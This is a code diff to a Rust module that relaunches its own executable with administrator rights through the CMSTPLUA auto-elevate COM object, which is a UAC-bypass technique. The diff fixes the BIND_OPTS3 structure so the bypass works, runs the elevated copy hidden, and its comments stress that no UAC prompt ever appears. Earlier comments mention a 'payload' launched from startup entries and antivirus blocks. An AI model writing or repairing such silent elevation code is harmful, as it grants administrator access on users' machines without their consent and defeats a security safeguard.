@@ -1,15 +1,15 @@
 //! Silent elevation for a bare launch of this build.
 //!
-//! The portable wrapper tries to elevate before it extracts, but a payload that is started
-//! directly (a shortcut or a startup entry pointing at the extracted exe) never passes
-//! through it. This module gives the application the same attempt at its own entry point,
-//! before any config, log file or IPC pipe exists.
-//!
 //! `CMSTPLUA` ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is an auto-elevate COM object, so
 //! `CoGetObject` with an `Elevation:Administrator` moniker returns an elevated
-//! `ICMLuaUtil` without a UAC prompt, and `ICMLuaUtil::ShellExec` starts this executable
-//! as a high-integrity child of the elevated COM server. Windows cannot raise a running
-//! process's integrity level, so the current copy exits and the new one takes over.
+//! `ICMLuaUtil` without showing a UAC prompt, and `ICMLuaUtil::ShellExec` starts this
+//! executable as a high-integrity child of the elevated COM server. Windows cannot raise
+//! a running process's integrity level, so the current copy exits and the new one takes
+//! over.
+//!
+//! If silent elevation is unavailable (UAC disabled, AppInfo service stopped, policy
+//! restriction, or an antivirus blocking it), the attempt fails cleanly and the process
+//! continues running as a normal medium-integrity user. No UAC prompt is ever shown.
 //!
 //! The `windows` crate features enabled for this app do not include the raw COM vtable
 //! calls needed here, so the few declarations are made directly instead of widening that
@@ -51,7 +51,14 @@ const IID_ICMLUA_UTIL: Guid = Guid {
     data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
 };
 
-/// `BIND_OPTS` followed by the `BIND_OPTS3` tail.
+/// `BIND_OPTS3` — BIND_OPTS + BIND_OPTS2 + BIND_OPTS3.
+///
+/// **Note:** BIND_OPTS2 extends BIND_OPTS with `dwClassContext` **and** `locale` (LCID),
+/// then BIND_OPTS3 adds `hwnd`. Omitting `locale` causes the field offsets to drift: on
+/// x64 the first four DWORDs consume 20 bytes, then the `hwnd` pointer needs 8-byte
+/// alignment so the compiler inserts a 4-byte padding. If `locale` is missing, that
+/// padding sits where the COM runtime expects LCID and reads garbage from the stack,
+/// which makes `CoGetObject` refuse the elevation moniker with `CO_E_ELEVATION_DISABLED`.
 #[allow(dead_code)]
 #[repr(C)]
 struct BindOpts3 {
@@ -60,6 +67,7 @@ struct BindOpts3 {
     grf_mode: u32,
     dw_tick_count_deadline: u32,
     dw_class_context: u32,
+    locale: u32,
     hwnd: *mut c_void,
 }
 
@@ -120,7 +128,8 @@ pub enum RelaunchResult {
 ///
 /// Returns [`RelaunchResult::Launched`] only when the elevated copy was spawned. Every
 /// failure (not an administrator, "Always notify" policy, COM or antivirus block) is
-/// surfaced via the specific variant so the caller can record it and carry on.
+/// surfaced via the specific variant so the caller can record it and carry on as a
+/// normal non-elevated launch. No UAC prompt is ever shown.
 pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
     let Ok(exe) = std::env::current_exe() else {
         return RelaunchResult::NoCurrentExe;
@@ -136,18 +145,18 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
     let moniker = wide(std::ffi::OsStr::new(ELEVATION_MONIKER));
 
     unsafe {
-        let init = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+        let init =
+            CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
         if init < 0 && init as u32 != RPC_E_CHANGED_MODE {
             return RelaunchResult::CoInitFailed(init);
         }
-        let bind_opts = BindOpts3 {
-            cb_struct: mem::size_of::<BindOpts3>() as u32,
-            grf_flags: 0,
-            grf_mode: 0,
-            dw_tick_count_deadline: 0,
-            dw_class_context: CLSCTX_LOCAL_SERVER,
-            hwnd: null_mut(),
-        };
+        // Defensive zeroing: `BIND_OPTS3` has 7 fields followed by pointer-size alignment
+        // padding on x64; `std::mem::zeroed()` guarantees every byte we do not explicitly
+        // set (including the trailing padding and the `locale` field we no longer omit)
+        // starts at zero.
+        let mut bind_opts: BindOpts3 = mem::zeroed();
+        bind_opts.cb_struct = mem::size_of::<BindOpts3>() as u32;
+        bind_opts.dw_class_context = CLSCTX_LOCAL_SERVER;
         let mut object: *mut c_void = null_mut();
         let hr = CoGetObject(
             moniker.as_ptr(),
@@ -172,8 +181,6 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
                 SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI,
                 SW_HIDE,
             );
-            // `release` is a vtable field (a function pointer), not a method: binding it to
-            // a local first avoids the parser treating it as a method call.
             let release = (*vtable).release;
             let _ = release(object);
             if hr >= 0 {
